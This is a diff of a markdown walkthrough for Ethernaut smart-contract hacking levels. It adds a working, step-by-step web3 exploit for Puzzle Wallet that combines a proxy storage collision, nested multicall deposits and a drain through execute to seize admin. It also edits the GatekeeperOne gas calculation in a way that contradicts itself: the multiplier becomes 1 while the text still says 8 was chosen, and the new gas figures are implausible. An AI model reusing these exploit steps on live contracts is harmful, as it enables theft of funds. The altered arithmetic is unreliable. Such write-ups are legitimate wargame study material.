@@ -1066,7 +1066,7 @@ Given contract:
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import '@openzeppelin/contracts/math/SafeMath.sol';
+import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol';
 
 contract GatekeeperOne {
 
@@ -1157,25 +1157,25 @@ See the list of opcodes executed corresponding to our contract execution. Step o
 139 RETURN
 ```
 
-Step here and there to locate the `GAS` opcode which corresponds to `gasleft` call. Proceed just one step more (to `PUSH2` here) and note the "remaining gas" from **Step Detail** just below. In my case it's `89746`. Hence gas used up to that point:
+Step here and there to locate the `GAS` opcode which corresponds to `gasleft` call. Proceed just one step more (to `PUSH2` here) and note the "remaining gas" from **Step Detail** just below. In my case it's `4395`. Hence gas used up to that point:
 
 ```
 gasUsed = _gas - remaining_gas
-or, gasUsed = 90000 - 89746
-or, gasUsed = 254
+or, gasUsed = 90000 - 4395
+or, gasUsed = 85605
 ```
 
 Now, we have `gasUsed` and we want set a `_gas` such that `gasLeft` returns a multiple of 8191. One such value would be:
 
 ```
-_gas = (8191 * 8) + gasUsed
-or, _gas = (8191 * 8) + 254
-or, _gas = 65782
+_gas = (8191 * 1) + gasUsed
+or, _gas = (8191 * 1) + 85605
+or, _gas = 93796
 ```
 
 (Note that I randomly chose `8` to multiply to 8191, you can choose any as log as sufficient gas is provided for transaction)
 
-So `_gas` should probably be `65782` to pass the check. But, the target `GateKeeperOne` contract (Ethernaut's instance) on Rinkeby network must've had a little bit of different compile time options. So correct `_gas` is not necessarily `65782`, but a close one. Let's pick a reasonable margin around `65782` and call `enter` for all values around `65782` with that margin. A margin of `64` worked for me. Let's update `GatePassOne`:
+So `_gas` should probably be `93796` to pass the check. But, the target `GateKeeperOne` contract (Ethernaut's instance) on Rinkeby network must've had a little bit of different compile time options. So correct `_gas` is not necessarily `93796`, but a close one. Let's pick a reasonable margin around `93796` and call `enter` for all values around `93796` with that margin. A margin of `64` worked for me. Let's update `GatePassOne`:
 
 ```solidity
 contract GatePassOne {
@@ -2388,7 +2388,7 @@ contract EvilToken is ERC20 {
 }
 ```
 
-We're going to exchange `EVL` token for `token1` and `token2` in such a way to drain both from `DexTwo`. Initially both `token1` and `token2` is 100. Let's send 100 of `EVL` to `DexTwo` using `EvilToken`'s `transfer`. So, that price ratio in `DexTwo` between `EVL` and `token1` is 1:1. Same ratio goes for `token2`.
+We're going to exchange `EVL` token for `token1` and `token2` in such a way to drain both from `DexTwo`. Initially both `token1` and `token2` is 100. **Let's send 100 of `EVL` to `DexTwo` using `EvilToken`'s `transfer`.** So, that price ratio in `DexTwo` between `EVL` and `token1` is 1:1. Same ratio goes for `token2`.
 
 Also, allow `DexTwo` to transact 300 (100 for `token1` and 200 for `token2` exchange) of our `EVL` tokens so that it can swap `EVL` tokens. This can be done by `approve` method of `EvilToken`, passing `contract.address` and `200` as params.
 
@@ -2436,10 +2436,159 @@ Finally:
 |   0    |  100   | 200 |  110   |   10   | 200 |
 |   0    |   0    | 400 |  110   |  110   |  0  |
 
+As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.
+
+Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trustworthy.
+
+Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).
+
+Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.
+
+If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.
+
 Useful links:
 [Using Remix to Deploy to Moonbeam](https://docs.moonbeam.network/builders/build/eth-api/dev-env/remix/)
 
 ### Level 24. Puzzle Wallet
+
+**Goal**: `player` has to hijack the proxy contract, `PuzzleProxy` by becoming `admin`.
+
+The vulnerability here arises due to **storage collision** between the proxy contract (`PuzzleProxy`) and logic contract (`PuzzleWallet`). And storage collision is a nightmare when using `delegatecall`.
+
+Note that in proxy pattern any call/transaction sent does not directly go to the logic contract (`PuzzleWallet` here), but it is actually **delegated** to logic contract inside proxy contract (`PuzzleProxy` here) through `delegatecall` method.
+
+Since, `delegatecall` is _context preserving_, the context is taken from `PuzzleProxy`. Meaning, any state read or write in storage would happen in `PuzzleProxy` at a corresponding slot, instead of `PuzzleWallet`.
+
+Compare the storage variables at slots:
+
+```
+slot | PuzzleWallet  -  PuzzleProxy
+----------------------------------
+  0  |   owner      <-  pendingAdmin
+  1  |   maxBalance <-  admin
+  2  |              ...
+  3  |              ...
+```
+
+Accordingly, any write to `pendingAdmin` in `PuzzleProxy` would be reflected by `owner` in `PuzzleWallet` because they are at same storage slot, 0.
+
+And that means if we set `pendingAdmin` to `player` in `PuzzleProxy` (through `proposeNewAdmin` method), `player` is automatically `owner` in `PuzzleWallet`. Although contract instance provided `web3js` API, it doesn't expose the `proposeNewAdmin` method, **_we can alway encode signature of function call and send transaction to the contract_**:
+
+```js
+functionSignature = {
+  name: "proposeNewAdmin",
+  type: "function",
+  inputs: [
+    {
+      type: "address",
+      name: "_newAdmin",
+    },
+  ],
+};
+
+params = [player];
+
+data = web3.eth.abi.encodeFunctionCall(functionSignature, params);
+
+await web3.eth.sendTransaction({ from: player, to: instance, data });
+```
+
+`player` is now `owner`. Verify by:
+
+```js
+(await contract.owner()) === player;
+```
+
+Now, since we're `owner` let's whitelist us, `player`:
+
+```js
+await contract.addToWhitelist(player);
+```
+
+Okay, so now `player` can call `onlyWhitelisted` guarded methods.
+
+Also, note from the storage slot table above that `admin` and `maxBalance` also correspond to same slot (slot 1). We can write to `admin` if in some way we can write to `maxBalance` the address of `player`.
+
+Two methods alter `maxBalance` - `init` and `setMaxBalance`. `init` shows no hope as it `require`s current `maxBalance` value to be zero. So, let's focus on `setMaxBalance`.
+
+`setMaxBalance` can only set new `maxBalance` only if the contract's balance is 0. Check balance:
+
+```js
+await getBalance(contract.address);
+```
+
+It's non-zero. Can we somehow take out the contract's balance? Only method that does so, is `execute`, but contract tracks each user's balance through `balances` such that you can only withdraw what you deposited. We need some way to crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance.
+
+A possible way is to somehow call `deposit` with same `msg.value` _multiple_ times within the same transaction. The developers of this contract did write logic to batch multiple transactions into one transaction to save gas costs. And this is what `multicall` method is for.
+
+`multicall` actually extracts function selector (which is first 4 bytes from signature) from the data and makes sure that `deposit` is called only once per transaction...
+
+```solidity
+assembly {
+    selector := mload(add(_data, 32))
+}
+if (selector == this.deposit.selector) {
+    require(!depositCalled, "Deposit can only be called once");
+    // Protect against reusing msg.value
+    depositCalled = true;
+}
+```
+
+We need another way. We can only call `deposit` only once in a `multicall` but what if call a `multicall` that calls multiple `multicall`s and each of these `multicall`s call deposit once. That'd be totally valid since each of these multiple `multicall`s will check their own separate `depositCalled` bools.
+
+The contract balance currently is `0.001 eth`. If we're able to call `deposit` two times through two `multicall`s in same transaction. The `balances[player]` would be registered from `0 eth` to `0.002 eth`, but in reality only `0.001 eth` will be actually sent. Hence total balance of contract is in reality `0.002 eth` but accounting in `balances` would think it's `0.003 eth`. Anyway, `player` is now eligible to take out `0.002 eth` from contract and drain it as a result.
+
+Here's our call _inception_
+
+```
+            multicall
+                |
+        ------------------
+        |                |
+    multicall        multicall
+        |                |
+     deposit          deposit
+```
+
+Get function call encodings:
+
+```js
+// deposit() method
+depositData = await contract.methods["deposit()"].request().then((v) => v.data);
+
+// multicall() method with param of deposit function call signature
+multicallData = await contract.methods["multicall(bytes[])"]
+  .request([depositData])
+  .then((v) => v.data);
+```
+
+Now we call `multicall` which will call two `multicall`s and each of these two will call `deposit` once each. Send value of `0.001 eth` with transaction:
+
+```js
+await contract.multicall([multicallData, multicallData], {
+  value: toWei("0.001"),
+});
+```
+
+`player` balance now must be `0.001 eth * 2` i.e. `0.002 eth`. Which is equal to contract's total balance at this time.
+
+Withdraw same amount by execute:
+
+```js
+await contract.execute(player, toWei("0.002"), 0x0);
+```
+
+By now, contract's balance must be zero. Verify:
+
+```js
+await getBalance(contract.address);
+```
+
+Finally we can call `setMaxBalance` to set `maxBalance` and as a consequence of storage collision, set admin to `player`:
+
+```js
+await contract.setMaxBalance(player);
+```
 
 ### Level 25. Motorbike
 
